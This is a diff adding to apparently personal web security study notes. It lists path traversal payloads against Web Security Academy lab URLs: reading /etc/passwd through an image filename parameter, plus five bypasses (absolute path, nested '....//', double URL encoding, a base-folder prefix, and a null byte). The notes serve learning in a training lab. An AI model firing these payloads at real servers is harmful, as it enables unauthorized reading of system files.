@@ -1045,10 +1045,17 @@ ________________________________________________________________________________
 Path traversal
 --------------
 path traversal in image URL > when you see an image > Open in newtab > https://0a3700b503319f0082c8ec4d00fb00cd.web-security-academy.net/image?filename=../../../../../../../../etc/passwd
-
 __________________________________________________________________________________________________________________________________________________________________
+Path traversal bypass  
+-----------------------
+1. to directly reference a file without using any traversal sequences
+https://0a3700b503319f0082c8ec4d00fb00cd.web-security-academy.net/image?filename=/etc/passwd
 
+2. to use netsted path traversal (....//)
 
+3. URL-double-decode (..%252f..%252f..%252fetc/passwd)
 
+4. It might be possible to include the required base folder followed by suitable traversal sequences > ?filename=/var/www/images/etc/passwd
 
-__________________________________________________________________________________________________________________________________________________________________
+5. Use null byte to bypass > if null byte is used, behind the null byte is ignored, for example .jpg > ?filename=../../../../../etc/passwd%00.jpg
+______________________________________________________________________________________________________________________________________________________________
